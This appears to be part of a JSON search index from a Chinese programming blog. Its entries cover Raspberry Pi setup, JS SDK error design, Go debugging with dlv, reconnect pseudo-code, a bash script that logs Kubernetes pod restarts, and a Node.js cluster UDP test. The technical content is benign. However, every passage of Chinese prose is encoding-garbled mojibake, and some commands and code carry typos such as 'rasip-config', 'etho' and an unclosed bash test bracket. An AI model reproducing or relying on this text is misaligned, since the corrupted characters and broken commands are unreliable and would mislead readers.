ä½¿ç”¨è¿™äº›å¸¦æ¡Œé¢çš„ç³»ç»Ÿæ—¶ï¼Œå¾ˆå¤§æ¦‚ç‡ç•Œé¢èƒ½è®©ä½ å¡çš„æƒ³æŠŠæ ‘è“æ´¾ç ¸äº†ã€‚\næ‰€ä»¥ä¼˜å…ˆé€‰æ‹©ä¸å¸¦å›¾å½¢ç•Œé¢çš„liteç‰ˆæœ¬çš„ç³»ç»Ÿï¼Œå¦‚æœç¡®å®éœ€è¦çš„è¯ï¼Œå¯ä»¥å†å®‰è£…lxde\nç½‘çº¿æ’äº†ï¼Œè¿˜æ˜¯æ— æ³•è”ç½‘ æ’äº†ç½‘çº¿ï¼Œç½‘å£ä¸Šçš„ç»¿ç¯ä¹Ÿæ˜¯åœ¨é—ªçƒï¼Œä½†æ˜¯eth0å°±æ˜¯æ— æ³•è”ç½‘æˆåŠŸã€‚çœŸæ˜¯æ°”äººã€‚\nè§£å†³æ–¹æ¡ˆï¼š ç¼–è¾‘ /etc/network/interfaces, å°†é‡Œé¢çš„å†…å®¹æ”¹å†™æˆä¸‹é¢çš„ï¼Œç„¶åé‡å¯æ ‘è“æ´¾ã€‚\nè¿™ä¸ªé…ç½®æ–‡ä»¶çš„æ¶µä¹‰æ˜¯ï¼šåœ¨å¯åŠ¨æ—¶å°±ä½¿ç”¨eth0æœ‰çº¿ç½‘å¡ï¼Œå¹¶ä¸”ä½¿ç”¨dhcpç»™è¿™ä¸ªç½‘å¡è‡ªåŠ¨é…ç½®IP\nauto eth0 iface eth0 inet dhcp iface etho inet6 dhcp source-directory /etc/network/interfaces.d æ— æ¡Œé¢ç‰ˆæœ¬ï¼Œå¦‚ä½•æ‰‹å·¥å®‰è£…æ¡Œé¢ é¦–å…ˆå®‰è£…lxde\nsudo apt update sudo apt install lxde -y ç„¶åé€šè¿‡raspi-config, é…ç½®é»˜è®¤ä»æ¡Œé¢å¯åŠ¨\nsudo rasip-config é€‰æ‹©ç³»ç»Ÿé…ç½®, æŒ‰å›è½¦é”®è¿›å…¥ é€‰æ‹©Boot/Auto loginï¼Œ æŒ‰å›è½¦è¿›å…¥\né€‰æ‹©Desktop, å›è½¦ç¡®è®¤ã€‚ä¿å­˜ä¹‹åï¼Œé€€å‡ºé‡å¯ã€‚\né”®ç›˜æ— æ³•è¾“å…¥| | åœ¨linuxä¸­æ˜¯ç®¡é“çš„æ„æ€ï¼Œç„¶è€Œæˆ‘çš„é”®ç›˜å´æ— æ³•è¾“å…¥ã€‚æœ€ç»ˆå‘ç°æ˜¯é”®ç›˜å¸ƒå±€çš„åŸå› ã€‚\nåœ¨å›¾æ ‡ä¸Šå³é”®ï¼Œé€‰æ‹©é…ç½®\næ³¨æ„è¿™é‡Œæ˜¯US, è¿™æ˜¯æ­£å¸¸çš„ã€‚å¦‚æœæ˜¯UKï¼Œå°±æ˜¯è‹±å¼å¸ƒå±€ï¼Œæ˜¯æœ‰é—®é¢˜çš„ï¼Œéœ€è¦æŠŠUKçš„åˆ é™¤ï¼Œé‡æ–°å¢åŠ ä¸€ä¸ªUSçš„ã€‚\nå¦‚ä½•å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„neovim? æ ‘è“æ´¾ä½¿ç”¨aptå®‰è£…çš„neovimï¼Œ ç‰ˆæœ¬å¤ªè€äº†ã€‚å¾ˆå¤šæ’ä»¶ä½¿ç”¨ä¸Šéƒ½ä¼šä½“éªŒä¸å¥½ã€‚æ‰€ä»¥å»ºè®®å®‰è£…æœ€æ–°ç‰ˆçš„neovimã€‚\nsudo apt install snapd sudo snap install --classic nvim æ³¨æ„ï¼š nvimçš„é»˜è®¤å®‰è£…çš„è·¯å¾„æ˜¯/snap/bin, æ‰€ä»¥ä½ éœ€è¦æŠŠè¿™ä¸ªè·¯å¾„è®¾ç½®åˆ°PATHé‡Œï¼Œæ‰èƒ½ä½¿ç”¨nvim. å¦‚ä½•å®‰è£…æœ€æ–°çš„golangï¼Ÿ æ‰“å¼€è¿™ä¸ªé¡µé¢ https://golang.google.cn/dl/\nå› ä¸ºæ ‘è“æ˜¯armhfæ¶æ„çš„ï¼Œæ‰€ä»¥è¿™è¿™ä¹ˆå¤šç‰ˆæœ¬é‡Œï¼Œåªæœ‰armv6lè¿™ä¸ªç‰ˆæœ¬æ˜¯èƒ½å¤Ÿåœ¨æ ‘è“æ´¾ä¸Šè¿è¡Œçš„ã€‚\nå‹ç¼©åŒ…ä¸‹è½½ä¹‹åè§£å‹ï¼Œé‡Œé¢çš„go/binç›®å½•ä¸­å°±æœ‰goçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåªè¦å°†è¿™ä¸ªç›®å½•æš´éœ²åˆ°PTAHä¸­ï¼Œå°±èƒ½ä½¿ç”¨golangäº†ã€‚","title":"æ ‘è“æ´¾3b+è¸©å‘è®°å½•"},{"content":"å…³äºjs sdkçš„è®¾è®¡ï¼Œè¿™ç¯‡æ–‡æ¡£åŸºæœ¬ä¸Šè¯¦ç»†ä»‹ç»äº†å¾ˆå¤šçš„ç‚¹ï¼Œå€¼å¾—æ·±å…¥é˜…è¯»ä¸€éã€‚https://github.com/hueitan/javascript-sdk-design\nç„¶è€Œæœ€è¿‘åœ¨é‡æ„æŸä¸ªjs sdkæ—¶ï¼Œä¹Ÿå‘ç°äº†ä¸€äº›é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜å¹¶ä¸å­˜åœ¨äºä¸Šè¿°æ–‡ç« ä¸­çš„ã€‚\njs sdkåœ¨æ”¶åˆ°æœåŠ¡ç«¯çš„å“åº”æ—¶ï¼Œç›´æ¥å°†serverç«¯è¿”å›çš„é”™è¯¯ç ç»™åˆ°ç”¨æˆ·ã€‚\nè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªå“åº”ç ï¼Œå®é™…ä¸Šæ˜¯js sdkå’Œserverä¹‹é—´çš„æ¶ˆæ¯äº¤æµã€‚å¹¶ä¸æ˜¯js sdkå’Œç”¨æˆ·ä¹‹é—´çš„æ¶ˆæ¯äº¤æµã€‚\nå¦‚æœæˆ‘ä»¬å°†serverç«¯çš„å“åº”ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œåˆ™js sdkå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªé€æ˜ä»£ç†ã€‚ç”¨æˆ·å°†ä¼šå’Œserverç«¯äº§ç”Ÿå¼ºè€¦åˆã€‚å¦‚æœserverç«¯æœ‰ä¸å…¼å®¹çš„å˜åŒ–ï¼Œå°†ä¼šç›´æ¥å½±å“åˆ°ç”¨æˆ·çš„ä½¿ç”¨ã€‚\næ‰€ä»¥è¾ƒå¥½çš„åšæ³•æ˜¯js sdkå°†è¿™ä¸ªé”™è¯¯å°è£…ä¸ºå¦ä¸€ä¸ªç§è¡¨ç°å½¢å¼ï¼Œå’Œserverç«¯åˆ†ç¦»å‡ºæ¥ã€‚\n","permalink":"https://wdd.js.org/posts/2021/08/kbcih7/","summary":"å…³äºjs sdkçš„è®¾è®¡ï¼Œè¿™ç¯‡æ–‡æ¡£åŸºæœ¬ä¸Šè¯¦ç»†ä»‹ç»äº†å¾ˆå¤šçš„ç‚¹ï¼Œå€¼å¾—æ·±å…¥é˜…è¯»ä¸€éã€‚https://github.com/hueitan/javascript-sdk-design\nç„¶è€Œæœ€è¿‘åœ¨é‡æ„æŸä¸ªjs sdkæ—¶ï¼Œä¹Ÿå‘ç°äº†ä¸€äº›é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜å¹¶ä¸å­˜åœ¨äºä¸Šè¿°æ–‡ç« ä¸­çš„ã€‚\njs sdkåœ¨æ”¶åˆ°æœåŠ¡ç«¯çš„å“åº”æ—¶ï¼Œç›´æ¥å°†serverç«¯è¿”å›çš„é”™è¯¯ç ç»™åˆ°ç”¨æˆ·ã€‚\nè¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªå“åº”ç ï¼Œå®é™…ä¸Šæ˜¯js sdkå’Œserverä¹‹é—´çš„æ¶ˆæ¯äº¤æµã€‚å¹¶ä¸æ˜¯js sdkå’Œç”¨æˆ·ä¹‹é—´çš„æ¶ˆæ¯äº¤æµã€‚\nå¦‚æœæˆ‘ä»¬å°†serverç«¯çš„å“åº”ç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼Œåˆ™js sdkå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªé€æ˜ä»£ç†ã€‚ç”¨æˆ·å°†ä¼šå’Œserverç«¯äº§ç”Ÿå¼ºè€¦åˆã€‚å¦‚æœserverç«¯æœ‰ä¸å…¼å®¹çš„å˜åŒ–ï¼Œå°†ä¼šç›´æ¥å½±å“åˆ°ç”¨æˆ·çš„ä½¿ç”¨ã€‚\næ‰€ä»¥è¾ƒå¥½çš„åšæ³•æ˜¯js sdkå°†è¿™ä¸ªé”™è¯¯å°è£…ä¸ºå¦ä¸€ä¸ªç§è¡¨ç°å½¢å¼ï¼Œå’Œserverç«¯åˆ†ç¦»å‡ºæ¥ã€‚","title":"js sdk è·¨å±‚ç©¿é€é—®é¢˜"},{"content":"æœ¬æ¥æ‰“ç®—ç”¨gdbè°ƒè¯•çš„ï¼Œçœ‹äº†å®˜æ–¹çš„æ–‡æ¡£https://golang.org/doc/gdbï¼Œ å®˜æ–¹æ›´æ¨èä½¿ç”¨delveè¿™ä¸ªå·¥å…·è°ƒè¯•ã€‚\næˆ‘çš„ç”µè„‘æ˜¯linux, æ‰€ä»¥å°±ç”¨å¦‚ä¸‹çš„å‘½ä»¤å®‰è£…ã€‚\ngo install github.com/go-delve/delve/cmd/dlv@latest\næˆ‘è¦è°ƒè¯•çš„å¹¶ä¸æ˜¯ä¸€ä¸ªä»£ç è€Œæ˜¯ä¸€ä¸ªæµ‹è¯•çš„ä»£ç ã€‚\nå½“æ‰§è¡Œæµ‹è¯•çš„æ—¶å€™æŠ¥é”™çš„ä½ç½®æ˜¯xxx/demo/demo_test.go, 200è¡Œ\ndlv test moduleName/demo \u0026gt; b demo_test.go:200 # åœ¨æ–‡ä»¶çš„å¯¹åº”è¡Œè®¾ç½®ç«¯ç‚¹ \u0026gt; bp # print all breakpoint \u0026gt; c # continue to exe \u0026gt; p variableName ","permalink":"https://wdd.js.org/golang/debug-with-dlv/","summary":"æœ¬æ¥æ‰“ç®—ç”¨gdbè°ƒè¯•çš„ï¼Œçœ‹äº†å®˜æ–¹çš„æ–‡æ¡£https://golang.org/doc/gdbï¼Œ å®˜æ–¹æ›´æ¨èä½¿ç”¨delveè¿™ä¸ªå·¥å…·è°ƒè¯•ã€‚\næˆ‘çš„ç”µè„‘æ˜¯linux, æ‰€ä»¥å°±ç”¨å¦‚ä¸‹çš„å‘½ä»¤å®‰è£…ã€‚\ngo install github.com/go-delve/delve/cmd/dlv@latest\næˆ‘è¦è°ƒè¯•çš„å¹¶ä¸æ˜¯ä¸€ä¸ªä»£ç è€Œæ˜¯ä¸€ä¸ªæµ‹è¯•çš„ä»£ç ã€‚\nå½“æ‰§è¡Œæµ‹è¯•çš„æ—¶å€™æŠ¥é”™çš„ä½ç½®æ˜¯xxx/demo/demo_test.go, 200è¡Œ\ndlv test moduleName/demo \u0026gt; b demo_test.go:200 # åœ¨æ–‡ä»¶çš„å¯¹åº”è¡Œè®¾ç½®ç«¯ç‚¹ \u0026gt; bp # print all breakpoint \u0026gt; c # continue to exe \u0026gt; p variableName ","title":"Debug With Dlv"},{"content":"ç¨‹åºå¯èƒ½å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯æŒ‰ç…§æ­£å¸¸çš„é€»è¾‘è¿è¡Œï¼Œç„¶è€Œä¹Ÿæœ‰å°‘æ•°çš„æ¦‚ç‡ï¼Œç¨‹åºå‘ç”Ÿå¼‚å¸¸ã€‚\nä¼˜ç§€ç¨‹åºï¼Œä¸ä»…ä»…è¦è€ƒè™‘æ­£å¸¸è¿è¡Œï¼Œè¿˜éœ€è¦è€ƒè™‘ä¸¤ç‚¹ï¼š\nå¦‚ä½•å¤„ç†å¼‚å¸¸ å¦‚ä½•åœ¨å‘ç”Ÿå¼‚å¸¸åï¼Œå¿«é€Ÿå®šä½åŸå›  æ­£å¸¸çš„å¤„ç†å¦‚æœç§°ä¸ºæ”¶ç›Šçš„è¯ï¼Œå¼‚å¸¸çš„å¤„ç†å°±æ˜¯è¦èƒ½å¤ŸåŠæ—¶æ­¢æŸã€‚\nèƒ½ç¨³å®šè¿è¡Œ364å¤©çš„ç¨‹åºï¼Œå¾ˆå¯èƒ½å› ä¸ºä¸€å¤©çš„é—®é¢˜ï¼Œå°±è¢«å®¢æˆ·æŠ›å¼ƒã€‚å› ä¸ºè¿™ä¸€å¤©çš„æŸå¤±ï¼Œå°±å¯èƒ½ä¼šè¶…è¿‡ä¹‹å‰æ”¶ç›Šçš„æ€»å’Œã€‚\nå¼‚å¸¸åº”å½“å¦‚ä½•å¤„ç† å¦‚æœäº‹æƒ…æœ‰å˜åçš„å¯èƒ½ï¼Œä¸ç®¡è¿™ç§å¯èƒ½æ€§æœ‰å¤šå°ï¼Œå®ƒæ€»ä¼šå‘ç”Ÿã€‚ã€Šè«éå®šå¾‹ã€‹\nå¯¹äºç¨‹åºæ¥è¯´ï¼Œé¿å…å˜åçš„æ–¹æ³•åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯ä¸è¦è¿è¡Œç¨‹åºï¼ˆçº¯ç²¹åºŸè¯ğŸ˜‚ï¼‰ã€‚\n1. åŠæ—¶å´©æºƒ var conn = nil var maxConnectTimes = 3 var reconnectDelay = 3 * 1000 var currentReconnectTimes = 0 var timeId = 0 func InitDb () { conn = connect(\u0026#34;æ•°æ®åº“\u0026#34;) conn.on(\u0026#34;connected\u0026#34;, ()=\u0026gt;{ // å°†å½“å‰é‡è¿æ¬¡æ•°é‡åˆ¶ä¸º0 currentReconnectTimes = 0 }) conn.on(\u0026#34;error\u0026#34;, ReconnectDb) } func ReconnectDb () { conn.Close() // å¦‚æœé‡è¿æ¬¡æ•°å¤§äºæœ€å¤§é‡è¿æ¬¡æ•°ï¼Œå°†ä¸åœ¨é‡è¿ if currentReconnecTimes \u0026gt; maxConnectTimes { return } // å¦‚æœå·²ç»å‚¬åœ¨é‡è¿çš„ä»»åŠ¡ï¼Œåˆ™å…ˆå…³é—­ if timeId != 0 { cleanTimeout(timeId) } // å½“å‰é‡è¿æ¬¡æ•°å¢åŠ  currentReconnectTimes++ // å¼€å§‹å»¶è¿Ÿé‡è¿ timeId = setTimeout(InitDb, reconnectDelay) } 2. å¦‚ä½•å¿«é€Ÿå®šä½é—®é¢˜ ç¬¬ä¸€ï¼Œä»£ç çš„æ•¬ç•ä¹‹å¿ƒ ç¬¬äºŒï¼ŒåŠæ—¶å‘Šè­¦ã€‚æ—¥å¿—ï¼Œæˆ–è€…httpè¯·æ±‚ ç¬¬ä¸‰ï¼Œç¼–ç¨‹æ—¶ï¼Œå°±è¦è€ƒè™‘å¼‚å¸¸ã€‚ä¾‹å¦‚ç¨‹åºä¾èµ– MQæˆ–è€…Mysqlï¼Œå½“ä¸ä¹‹äº¤äº’çš„é“¾æ¥æ–­å¼€åï¼Œåº”è¯¥æ€æ ·å¤„ç†ï¼Ÿ ç¬¬å››ï¼Œå¤šå®ä¾‹é—®é¢˜è€ƒè™‘ ç¬¬äº”ï¼Œæ£€æŸ¥æ¸…å•\n","permalink":"https://wdd.js.org/posts/2021/08/brh6mu/","summary":"ç¨‹åºå¯èƒ½å¤§éƒ¨åˆ†æ—¶é—´éƒ½æ˜¯æŒ‰ç…§æ­£å¸¸çš„é€»è¾‘è¿è¡Œï¼Œç„¶è€Œä¹Ÿæœ‰å°‘æ•°çš„æ¦‚ç‡ï¼Œç¨‹åºå‘ç”Ÿå¼‚å¸¸ã€‚\nä¼˜ç§€ç¨‹åºï¼Œä¸ä»…ä»…è¦è€ƒè™‘æ­£å¸¸è¿è¡Œï¼Œè¿˜éœ€è¦è€ƒè™‘ä¸¤ç‚¹ï¼š\nå¦‚ä½•å¤„ç†å¼‚å¸¸ å¦‚ä½•åœ¨å‘ç”Ÿå¼‚å¸¸åï¼Œå¿«é€Ÿå®šä½åŸå›  æ­£å¸¸çš„å¤„ç†å¦‚æœç§°ä¸ºæ”¶ç›Šçš„è¯ï¼Œå¼‚å¸¸çš„å¤„ç†å°±æ˜¯è¦èƒ½å¤ŸåŠæ—¶æ­¢æŸã€‚\nèƒ½ç¨³å®šè¿è¡Œ364å¤©çš„ç¨‹åºï¼Œå¾ˆå¯èƒ½å› ä¸ºä¸€å¤©çš„é—®é¢˜ï¼Œå°±è¢«å®¢æˆ·æŠ›å¼ƒã€‚å› ä¸ºè¿™ä¸€å¤©çš„æŸå¤±ï¼Œå°±å¯èƒ½ä¼šè¶…è¿‡ä¹‹å‰æ”¶ç›Šçš„æ€»å’Œã€‚\nå¼‚å¸¸åº”å½“å¦‚ä½•å¤„ç† å¦‚æœäº‹æƒ…æœ‰å˜åçš„å¯èƒ½ï¼Œä¸ç®¡è¿™ç§å¯èƒ½æ€§æœ‰å¤šå°ï¼Œå®ƒæ€»ä¼šå‘ç”Ÿã€‚ã€Šè«éå®šå¾‹ã€‹\nå¯¹äºç¨‹åºæ¥è¯´ï¼Œé¿å…å˜åçš„æ–¹æ³•åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯ä¸è¦è¿è¡Œç¨‹åºï¼ˆçº¯ç²¹åºŸè¯ğŸ˜‚ï¼‰ã€‚\n1. åŠæ—¶å´©æºƒ var conn = nil var maxConnectTimes = 3 var reconnectDelay = 3 * 1000 var currentReconnectTimes = 0 var timeId = 0 func InitDb () { conn = connect(\u0026#34;æ•°æ®åº“\u0026#34;) conn.on(\u0026#34;connected\u0026#34;, ()=\u0026gt;{ // å°†å½“å‰é‡è¿æ¬¡æ•°é‡åˆ¶ä¸º0 currentReconnectTimes = 0 }) conn.on(\u0026#34;error\u0026#34;, ReconnectDb) } func ReconnectDb () { conn.Close() // å¦‚æœé‡è¿æ¬¡æ•°å¤§äºæœ€å¤§é‡è¿æ¬¡æ•°ï¼Œå°†ä¸åœ¨é‡è¿ if currentReconnecTimes \u0026gt; maxConnectTimes { return } // å¦‚æœå·²ç»å‚¬åœ¨é‡è¿çš„ä»»åŠ¡ï¼Œåˆ™å…ˆå…³é—­ if timeId != 0 { cleanTimeout(timeId) } // å½“å‰é‡è¿æ¬¡æ•°å¢åŠ  currentReconnectTimes++ // å¼€å§‹å»¶è¿Ÿé‡è¿ timeId = setTimeout(InitDb, reconnectDelay) } 2.","title":"é¢å‘å¼‚å¸¸ç¼–ç¨‹todo"},{"content":"ä¸€èˆ¬æ¥è¯´ï¼Œç›‘æ§podçŠ¶æ€é‡å¯å’Œå‘Šè­¦ï¼Œå¯ä»¥ä½¿ç”¨æ™®ç½—ç±³ä¿®æ–¯æˆ–è€…kubewatchã€‚\nä½†æ˜¯å¦‚æœä½ åªæƒ³å°†æŸä¸ªpodé‡å¯äº†ï¼Œå¾€æŸä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å†™ä¸€æ¡è®°å½•ï¼Œé‚£ä¹ˆä¸‹é¢çš„æ–¹å¼å°†æ˜¯éå¸¸ç®€å•çš„ã€‚\nå®ç°çš„æ€è·¯æ˜¯ä½¿ç”¨kubectl è·å–æ‰€æœ‰podçš„çŠ¶æ€ä¿¡æ¯ï¼Œç»Ÿè®¡å‘ç”Ÿè¿‡é‡å¯çš„pod, ç„¶åå’Œä¹‹å‰çš„é‡å¯æ¬¡æ•°åšå¯¹æ¯”ï¼Œå¦‚æœæ¯”ä¹‹å‰è®°å½•çš„æ¬¡æ•°å¤§ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å‘ç”Ÿè¿‡é‡å¯äº†ã€‚\n#!/bin/bash now=$(date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34;) log_file=\u0026#34;/var/log/pod.restart.log\u0026#34; ns=\u0026#34;some-namespace\u0026#34; echo $now start pod restart monitor \u0026gt;\u0026gt; $log_file # touchä¸€ä¸‹ä¹‹å‰çš„è®°å½•æ–‡ä»¶ï¼Œé˜²æ­¢æ–‡ä»¶ä¸å­˜åœ¨ touch restart.old.log # ç”Ÿæˆæœ¬æ¬¡çš„ç»Ÿè®¡æ•°æ® kubectl get pod -n $ns -o wide | awk \u0026#39;$4 \u0026gt; 0{print $1,$4}\u0026#39; | grep -v NAME \u0026gt; restart.now.log # æŒ‰è¡Œè¯»å–æœ¬æ¬¡ç»Ÿè®¡æ•°æ® # æ•°æ®æ ¼å¼ä¸ºï¼špodname é‡å¯æ¬¡æ•° while read line do # pod name name=$(echo $line | awk \u0026#39;{print $1}\u0026#39;) # é‡å¯æ¬¡æ•° count=$(echo $line | awk \u0026#39;{print $2}\u0026#39;) # æ£€æŸ¥æœ¬æ¬¡é‡å¯çš„podåç§°æ˜¯å¦åœ¨ä¹‹å‰çš„è®°å½•ä¸­å­˜åœ¨ if grep $name restart.old.log; then # å¦‚æœå­˜åœ¨ï¼Œåˆ™å–å‡ºä¹‹å‰è®°å½•çš„é‡å¯æ¬¡æ•° t=$(grep $name restart.old.log | awk \u0026#39;{print $2}\u0026#39;) # å’Œæœ¬æ¬¡è®°å½•çš„é‡å¯æ¬¡æ•°æ¯”è¾ƒï¼Œå¦‚æœæœ¬æ¬¡çš„é‡å¯æ¬¡æ•°è¾ƒå¤§ # åˆ™è¯´æ˜podä¸€å®šé‡å¯è¿‡ if [ $count -gt $t]; then echo $now ERROR pod_restart $name \u0026gt;\u0026gt; $log_file fi else # å¦‚æœé‡å¯çš„podä¸å­˜åœ¨ä¹‹å‰çš„è®°å½•ä¸­ï¼Œä¹Ÿè¯´æ˜podé‡å¯è¿‡ echo $now ERROR pod_restart $name \u0026gt;\u0026gt; $log_file fi done \u0026lt; restart.now.log # åˆ é™¤è€çš„è®°å½•æ–‡ä»¶ rm -f restart.old.log # å°†æ–°çš„è®°å½•æ–‡ä»¶é‡å‘½åä¸ºè€çš„è®°å½•æ–‡ä»¶ mv restart.now.log restart.old.log ç„¶åå¯ä»¥å°†ä¸Šé¢çš„è„šæœ¬åšæˆå®šæ—¶ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚é‚£ä¹ˆå°±å¯ä»¥å°†podé‡å¯çš„ä¿¡æ¯å†™å…¥æ–‡ä»¶ã€‚\nç„¶åé…åˆä¸€äº›æ—¥å¿—ç›‘æ§çš„ç¨‹åºï¼Œå°±å¯ä»¥ç›‘æ§æ—¥å¿—æ–‡ä»¶ã€‚ç„¶åæå–å…³é”®è¯ï¼Œæœ€åå‘é€å‘Šè­¦ä¿¡æ¯ã€‚\nå…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨å†™å‘Šè­¦æ—¥å¿—æ–‡ä»¶çš„åŒæ—¶ï¼Œé€šè¿‡curlå‘é€httpè¯·æ±‚ï¼Œæ¥å‘é€å‘Šè­¦é€šçŸ¥ã€‚\nåœ¨å…¬æœ‰äº‘ä¸Šï¼Œå¯ä»¥ä½¿ç”¨é’‰é’‰çš„é€šçŸ¥webhook, ä¹Ÿæ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚\n","permalink":"https://wdd.js.org/posts/2021/07/giqfii/","summary":"ä¸€èˆ¬æ¥è¯´ï¼Œç›‘æ§podçŠ¶æ€é‡å¯å’Œå‘Šè­¦ï¼Œå¯ä»¥ä½¿ç”¨æ™®ç½—ç±³ä¿®æ–¯æˆ–è€…kubewatchã€‚\nä½†æ˜¯å¦‚æœä½ åªæƒ³å°†æŸä¸ªpodé‡å¯äº†ï¼Œå¾€æŸä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å†™ä¸€æ¡è®°å½•ï¼Œé‚£ä¹ˆä¸‹é¢çš„æ–¹å¼å°†æ˜¯éå¸¸ç®€å•çš„ã€‚\nå®ç°çš„æ€è·¯æ˜¯ä½¿ç”¨kubectl è·å–æ‰€æœ‰podçš„çŠ¶æ€ä¿¡æ¯ï¼Œç»Ÿè®¡å‘ç”Ÿè¿‡é‡å¯çš„pod, ç„¶åå’Œä¹‹å‰çš„é‡å¯æ¬¡æ•°åšå¯¹æ¯”ï¼Œå¦‚æœæ¯”ä¹‹å‰è®°å½•çš„æ¬¡æ•°å¤§ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯å‘ç”Ÿè¿‡é‡å¯äº†ã€‚\n#!/bin/bash now=$(date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34;) log_file=\u0026#34;/var/log/pod.restart.log\u0026#34; ns=\u0026#34;some-namespace\u0026#34; echo $now start pod restart monitor \u0026gt;\u0026gt; $log_file # touchä¸€ä¸‹ä¹‹å‰çš„è®°å½•æ–‡ä»¶ï¼Œé˜²æ­¢æ–‡ä»¶ä¸å­˜åœ¨ touch restart.old.log # ç”Ÿæˆæœ¬æ¬¡çš„ç»Ÿè®¡æ•°æ® kubectl get pod -n $ns -o wide | awk \u0026#39;$4 \u0026gt; 0{print $1,$4}\u0026#39; | grep -v NAME \u0026gt; restart.now.log # æŒ‰è¡Œè¯»å–æœ¬æ¬¡ç»Ÿè®¡æ•°æ® # æ•°æ®æ ¼å¼ä¸ºï¼špodname é‡å¯æ¬¡æ•° while read line do # pod name name=$(echo $line | awk \u0026#39;{print $1}\u0026#39;) # é‡å¯æ¬¡æ•° count=$(echo $line | awk \u0026#39;{print $2}\u0026#39;) # æ£€æŸ¥æœ¬æ¬¡é‡å¯çš„podåç§°æ˜¯å¦åœ¨ä¹‹å‰çš„è®°å½•ä¸­å­˜åœ¨ if grep $name restart.","title":"ç›‘æ§podé‡å¯å¹¶å†™æ—¥å¿—æ–‡ä»¶"},{"content":"æœ¬æ¥æˆ‘çš„ç›®çš„æ˜¯ä½¿ç”¨clusteræ¨¡å—çš„forkå‡ºå¤šä¸ªè¿›ç¨‹ï¼Œè®©å„ä¸ªè¿›ç¨‹éƒ½èƒ½å¤„ç†udpæ¶ˆæ¯çš„ã€‚ä½†æ˜¯æœ€ç»ˆæµ‹è¯•å‘ç°ï¼Œå®é™…ä¸Šä»…æœ‰ä¸€ä¸ªè¿›ç¨‹å¤„ç†äº†ç»å¤§æ•°æ¶ˆæ¯ï¼Œå…¶ä»–çš„è¿›ç¨‹ï¼Œè¦ä¹ˆä¸å¤„ç†æ¶ˆæ¯ï¼Œè¦ä¹ˆå¤„ç†çš„éå¸¸å°‘çš„æ¶ˆæ¯ã€‚\nç„¶è€Œä½¿ç”¨clusteræ¥å¼€å¯httpæœåŠ¡çš„å¤šè¿›ç¨‹ï¼Œå´èƒ½å¤Ÿè¾¾åˆ°å¤šè¿›ç¨‹çš„è´Ÿè½½ã€‚\nserverç«¯demoä»£ç ï¼š const cluster = require(\u0026#39;cluster\u0026#39;) const numCPUs = require(\u0026#39;os\u0026#39;).cpus().length const { logger } = require(\u0026#39;./logger\u0026#39;) const dgram = require(\u0026#39;dgram\u0026#39;) // const { createHTTPServer, createUDPServer } = require(\u0026#39;./app\u0026#39;) const port = 8088 if (cluster.isMaster) { for (let i = 0; i \u0026lt; numCPUs; i++) { cluster.fork() } cluster.on(\u0026#39;exit\u0026#39;, (worker, code, signal) =\u0026gt; { logger.info(`å·¥ä½œè¿›ç¨‹ ${worker.process.pid} å·²é€€å‡º`) }) } else { const server = dgram.createSocket({ type: \u0026#39;udp4\u0026#39;, reuseAddr: true }) server.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { logger.info(`udp server error:\\n${err.stack}`) server.close() }) server.on(\u0026#39;message\u0026#39;, (msg, rinfo) =\u0026gt; { logger.info(`${process.pid} udp server got: ${msg} from ${rinfo.address}:${rinfo.port}`) }) server.on(\u0026#39;listening\u0026#39;, () =\u0026gt; { const address = server.address() logger.info(`udp server listening ${address.address}:${address.port}`) }) server.bind(port) } æ—¥å¿—åº“å¦‚ä¸‹ï¼š\nconst logger = require(\u0026#39;pino\u0026#39;)() module.exports = { logger } å¯åŠ¨æœåŠ¡ä¹‹åï¼Œä»æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°ï¼šå¯åŠ¨äº†å››ä¸ªè¿›ç¨‹ã€‚\n{\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601194869,\u0026#34;pid\u0026#34;:98795,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;udp server listening 0.0.0.0:8088\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601194870,\u0026#34;pid\u0026#34;:98797,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;udp server listening 0.0.0.0:8088\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601194872,\u0026#34;pid\u0026#34;:98798,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;udp server listening 0.0.0.0:8088\u0026#34;} {\u0026#34;level\u0026#34;:30,\u0026#34;time\u0026#34;:1626601194876,\u0026#34;pid\u0026#34;:98796,\u0026#34;hostname\u0026#34;:\u0026#34;wdd-2.local\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;udp server listening 0.0.0.0:8088\u0026#34;} ç„¶åæˆ‘ä»¬ä½¿ç”¨nc, æ¥å‘è¿™ä¸ªudpserverå‘é€æ¶ˆæ¯\nnc 0.0.0.0 8088 ... 